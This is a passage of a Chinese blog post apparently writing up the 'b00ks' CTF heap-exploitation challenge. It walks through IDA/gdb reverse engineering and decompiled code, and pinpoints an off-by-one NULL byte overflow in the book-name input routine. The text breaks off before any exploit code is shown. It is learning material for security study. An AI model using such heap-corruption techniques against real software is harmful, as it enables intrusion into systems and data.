<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>PWN 堆利用 off-by-one NULL byte - b00ks writeup - 李三的剑谱</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="李三的剑谱"><meta name="msapplication-TileImage" content="/img/logo.png"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="李三的剑谱"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="从零开始的二进制旅程"><meta property="og:type" content="blog"><meta property="og:title" content="PWN 堆利用 off-by-one NULL byte - b00ks writeup"><meta property="og:url" content="https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/"><meta property="og:site_name" content="李三的剑谱"><meta property="og:description" content="从零开始的二进制旅程"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image1.png"><meta property="og:image" content="https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image2.png"><meta property="og:image" content="https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image3.png"><meta property="og:image" content="https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image4.png"><meta property="og:image" content="https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image5.png"><meta property="og:image" content="https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image6.png"><meta property="og:image" content="https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image7.png"><meta property="og:image" content="https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image8.png"><meta property="og:image" content="https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image9.png"><meta property="og:image" content="https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image10.png"><meta property="og:image" content="https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image11.png"><meta property="og:image" content="https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image12.png"><meta property="og:image" content="https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image13.png"><meta property="og:image" content="https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image14.png"><meta property="og:image" content="https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image15.png"><meta property="og:image" content="https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image16.png"><meta property="og:image" content="https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image17.png"><meta property="og:image" content="https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image18.png"><meta property="og:image" content="https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image19.png"><meta property="og:image" content="https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image20.png"><meta property="og:image" content="https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image21.png"><meta property="og:image" content="https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image22.png"><meta property="og:image" content="https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image23.png"><meta property="og:image" content="https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image24.png"><meta property="og:image" content="https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image25.png"><meta property="og:image" content="https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image26.png"><meta property="og:image" content="https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image27.png"><meta property="og:image" content="https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image28.png"><meta property="og:image" content="https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image29.png"><meta property="og:image" content="https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image30.png"><meta property="og:image" content="https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image31.png"><meta property="og:image" content="https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image32.png"><meta property="og:image" content="https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image33.png"><meta property="og:image" content="https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image34.png"><meta property="og:image" content="https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image35.png"><meta property="article:published_time" content="2024-08-11T13:02:28.000Z"><meta property="article:modified_time" content="2024-09-14T14:31:37.712Z"><meta property="article:author" content="李三（cl0und）"><meta property="article:tag" content="pwn"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image1.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/"},"headline":"PWN 堆利用 off-by-one NULL byte - b00ks writeup","image":["https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image1.png","https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image2.png","https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image3.png","https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image4.png","https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image5.png","https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image6.png","https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image7.png","https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image8.png","https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image9.png","https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image10.png","https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image11.png","https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image12.png","https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image13.png","https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image14.png","https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image15.png","https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image16.png","https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image17.png","https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image18.png","https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image19.png","https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image20.png","https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image21.png","https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image22.png","https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image23.png","https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image24.png","https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image25.png","https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image26.png","https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image27.png","https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image28.png","https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image29.png","https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image30.png","https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image31.png","https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image32.png","https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image33.png","https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image34.png","https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/image35.png"],"datePublished":"2024-08-11T13:02:28.000Z","dateModified":"2024-09-14T14:31:37.712Z","author":{"@type":"Person","name":"李三（cl0und）"},"publisher":{"@type":"Organization","name":"李三的剑谱","logo":{"@type":"ImageObject","url":"https://cl0und.github.io/img/logo.png"}},"description":"从零开始的二进制旅程"}</script><link rel="canonical" href="https://cl0und.github.io/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/"><link rel="icon" href="/img/logo.png"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="李三的剑谱" type="application/atom+xml">
</head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.png" alt="李三的剑谱" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2024-08-11T13:02:28.000Z" title="2024/8/11 21:02:28">2024-08-11</time></span><span class="level-item">Updated&nbsp;<time dateTime="2024-09-14T14:31:37.712Z" title="2024/9/14 22:31:37">2024-09-14</time></span><span class="level-item"><a class="link-muted" href="/categories/binary/">binary</a></span><span class="level-item">40 minutes read (About 5962 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">PWN 堆利用 off-by-one NULL byte - b00ks writeup</h1><div class="content"><p>最新刚开始学pwn，还不熟悉ida和gdb。此篇记录了off-by-one b00ks上这道题的复现，从ida/gdb使用到payload编写。文中有一些内存分布图片偷懒我没有自己画，引用自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_48466156/article/details/139691096">这篇文章</a>（写的很好）。侵删。</p>
<!-- more -->
<h2 id="基本信息检查"><a href="#基本信息检查" class="headerlink" title="基本信息检查"></a>基本信息检查</h2><p><img src="image1.png"></p>
<p><img src="image2.png"></p>
<h2 id="程序入口点分析"><a href="#程序入口点分析" class="headerlink" title="程序入口点分析"></a>程序入口点分析</h2><p>静态方法拿到程序入口</p>
<p><img src="image3.png"></p>
<p>动态方法</p>
<p><code>start</code></p>
<ul>
<li>功能：<code>start</code>命令用于加载程序并在程序的 <code>main</code> 函数的第一条语句之前设置一个临时断点。代码会执行到 <code>main</code> 函数启动之前，然后暂停，让你可以进行调试设置。</li>
<li>典型场景：<code>start</code>命令通常用于希望程序在还没有开始主要逻辑之前能暂停下来，让调试者有机会设置其他断点或检查初始状态。</li>
</ul>
<p><img src="image4.png"></p>
<p><img src="image5.png"></p>
<h2 id="入口指令恢复"><a href="#入口指令恢复" class="headerlink" title="入口指令恢复"></a>入口指令恢复</h2><p><img src="image6.png"></p>
<p><img src="image7.png"></p>
<p>这里看到IDA有一个错误的反编译，它把代码搞成了数据，选中这一段用 <code>Undefine</code>（快捷键 <code>U</code>），它会取消对该区域的数据显示。</p>
<p><img src="image8.png"></p>
<p>在取消定义后，右键点击同一区域。选择 <code>Code</code>（快捷键 <code>C</code>），这将告诉 IDA Pro 重新识别该区域为代码。</p>
<p>右键点击选择 <code>Code</code> 或按 <code>C</code> 键，选force，重新将选中的区域转换为代码。</p>
<p><img src="image9.png"></p>
<h2 id="确定main函数"><a href="#确定main函数" class="headerlink" title="确定main函数"></a>确定main函数</h2><p>根据LIBC_START_MAIN的函数原型我们可以知道，第一个参数是main函数的地址 -&gt; cs:11CFh</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc-2.24 ./csu/libc-start.c</span></span><br><span class="line">STATIC <span class="type">int</span> <span class="title function_">LIBC_START_MAIN</span> <span class="params">(<span class="type">int</span> (*main) (<span class="type">int</span>, <span class="type">char</span> **, <span class="type">char</span> **</span></span><br><span class="line"><span class="params">           MAIN_AUXVEC_DECL),</span></span><br><span class="line"><span class="params">          <span class="type">int</span> argc,</span></span><br><span class="line"><span class="params">          <span class="type">char</span> **argv,</span></span><br><span class="line"><span class="params">#ifdef LIBC_START_MAIN_AUXVEC_ARG</span></span><br><span class="line"><span class="params">          ElfW(<span class="type">auxv_t</span>) *auxvec,</span></span><br><span class="line"><span class="params">#endif</span></span><br><span class="line"><span class="params">          __typeof (main) init,</span></span><br><span class="line"><span class="params">          <span class="type">void</span> (*fini) (<span class="type">void</span>),</span></span><br><span class="line"><span class="params">          <span class="type">void</span> (*rtld_fini) (<span class="type">void</span>),</span></span><br><span class="line"><span class="params">          <span class="type">void</span> *stack_end)</span></span><br></pre></td></tr></table></figure>

<p><img src="image10.png"></p>
<p>由此找到main函数</p>
<p>在光标位于 <code>011CF</code> 地址上时，按下快捷键 <code>N</code>，会弹出一个对话框。输入 <code>main</code> 并确认。</p>
<p><img src="image11.png"></p>
<h2 id="代码阅读与函数名恢复"><a href="#代码阅读与函数名恢复" class="headerlink" title="代码阅读与函数名恢复"></a>代码阅读与函数名恢复</h2><p><img src="image12.png"></p>
<h3 id="banner-sub-A77"><a href="#banner-sub-A77" class="headerlink" title="banner(sub_A77)"></a>banner(sub_A77)</h3><p>我们一个一个来看，sub_A77输出banner信息，重命名为banner</p>
<p><img src="image13.png"></p>
<h3 id="edit-author-name-sub-B6D"><a href="#edit-author-name-sub-B6D" class="headerlink" title="edit_author_name(sub_B6D)"></a>edit_author_name(sub_B6D)</h3><p>需要用户输入author name，重命名为edit_author_name</p>
<p><img src="image14.png"></p>
<h3 id="create-book-sub-F55"><a href="#create-book-sub-F55" class="headerlink" title="create_book(sub_F55)"></a>create_book(sub_F55)</h3><p>sub_F55是在创建书，重命名为create book</p>
<p><img src="image15.png"></p>
<h3 id="delete-book-sub-BBD"><a href="#delete-book-sub-BBD" class="headerlink" title="delete_book(sub_BBD)"></a>delete_book(sub_BBD)</h3><p>sub_BBD是在删除书，重命名为delete_book</p>
<p><img src="image16.png"></p>
<h3 id="edit-book-sub-E17"><a href="#edit-book-sub-E17" class="headerlink" title="edit_book(sub_E17)"></a>edit_book(sub_E17)</h3><p>sub_E17在修改book, edit_book</p>
<p><img src="image17.png"></p>
<h3 id="list-book-sub-D1F"><a href="#list-book-sub-D1F" class="headerlink" title="list_book(sub_D1F)"></a>list_book(sub_D1F)</h3><p>在输出所有书籍信息, list_book</p>
<p><img src="image18.png"></p>
<h3 id="menu-sub-A89"><a href="#menu-sub-A89" class="headerlink" title="menu(sub_A89)"></a>menu(sub_A89)</h3><p>sub_A89给出了选项，根据用户不同输出跳转到上面的各个子功能。重命名为menu</p>
<p><img src="image19.png"></p>
<p>最后main被润色成如下</p>
<p><img src="image20.png"></p>
<h2 id="细读子功能-create-book"><a href="#细读子功能-create-book" class="headerlink" title="细读子功能 create_book"></a>细读子功能 create_book</h2><p>用户先输入一个size，然后malloc指定用户输入的size的大小</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 <span class="title function_">sub_F55</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp-28h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp-24h] [rbp-24h]</span></span><br><span class="line">  _DWORD *v3; <span class="comment">// [rsp-20h] [rbp-20h]</span></span><br><span class="line">  _BYTE *v4; <span class="comment">// [rsp-18h] [rbp-18h]</span></span><br><span class="line">  _BYTE *v5; <span class="comment">// [rsp-10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nEnter book name size: &quot;</span>, *(_QWORD *)&amp;v1);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter book name (Max 32 chars): &quot;</span>, &amp;v1);</span><br><span class="line">    v4 = <span class="built_in">malloc</span>(v1);</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)sub_9F5(v4, v1 - <span class="number">1</span>) )</span><br></pre></td></tr></table></figure>

<p>接着调用sub_9F5，让我们细看一下sub_9F5的作用，这里它循环读取用户输入内容并且赋值给刚才malloc的那块内存。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 __fastcall <span class="title function_">sub_9F5</span><span class="params">(_BYTE *a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp-14h] [rbp-14h]</span></span><br><span class="line">  _BYTE *v4; <span class="comment">// [rsp-10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v4 = a1;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)read(<span class="number">0</span>, v4, <span class="number">1uLL</span>) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *v4 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++v4;</span><br><span class="line">    <span class="keyword">if</span> ( i == a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们重名为scan_user_input。举个例子如果用户输入32, 那么就会调用scan_user_input(v4, 31)。scan_user_input内部循环从0读到31并且在第32位添加0，注意这里其实是一个 <em>off</em> -by-<em>one NULL byte</em>问题，用户申请32的空间，实际写入了33个字符。</p>
<p>如果一切回继续进入else部分</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  v2 = sub_B24();</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Library is full&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      v3[<span class="number">6</span>] = v1;</span><br><span class="line">      *((_QWORD *)off_202010 + v2) = v3;</span><br><span class="line">      *((_QWORD *)v3 + <span class="number">2</span>) = v5;</span><br><span class="line">      *((_QWORD *)v3 + <span class="number">1</span>) = v4;</span><br><span class="line">      *v3 = ++unk_202024;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Unable to allocate book struct&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用sub_B24</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 <span class="title function_">sub_B24</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp-8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  *((_DWORD *)&amp;v1 - <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( *((_DWORD *)&amp;v1 - <span class="number">1</span>) = <span class="number">0</span>; *((_DWORD *)&amp;v1 - <span class="number">1</span>) &lt;= <span class="number">19</span>; ++*((_DWORD *)&amp;v1 - <span class="number">1</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*((_QWORD *)off_202010 + *((<span class="type">signed</span> <span class="type">int</span> *)&amp;v1 - <span class="number">1</span>)) )</span><br><span class="line">      <span class="keyword">return</span> *((<span class="type">unsigned</span> <span 